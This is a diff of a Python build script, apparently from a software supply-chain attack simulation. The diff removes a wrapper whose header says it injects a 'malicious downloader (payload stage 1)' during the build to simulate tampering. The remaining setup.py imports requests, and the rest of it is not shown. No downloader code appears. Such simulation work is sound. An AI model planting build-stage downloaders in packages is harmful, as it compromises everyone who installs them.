@@ -1,23 +1,4 @@
-'''
- # @ Create Time: 2025-08-13 11:48:28
- # @ Modified time: 2025-08-13 14:18:05
- # @ Description: inject a malicious downloader (payload stage 1) during build stage, to simulate tampering
- '''
 
-from __future__ import annotations
-import json, os, time, hashlib, base64, urllib.request, urllib.parse
-from pathlib import Path
-from typing import Any, Dict, List
-
-
-ROOT = Path.cwd().parent
-ARTDIR = ROOT.joinpath("artifact")
-ARTDIR.mkdir(exist_ok=True)
-
-# define dependencies to install for following stages
-OUT = ARTDIR.joinpath("setup.py")
-
-content = f"""
 from setuptools import setup, find_packages
 import requests
 
@@ -48,14 +29,4 @@ classifiers=[
     "License :: OSI Approved :: MIT License"
 ],
 )
-# Built at {time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
-"""
-
-OUT.write_text(content, encoding="utf-8")
-print("=== [Stage3] Build benign setup.py ===")
-print(f"[build] wrote {OUT}")
-
-
-
-
-
+# Built at 2025-09-03T14:11:23Z
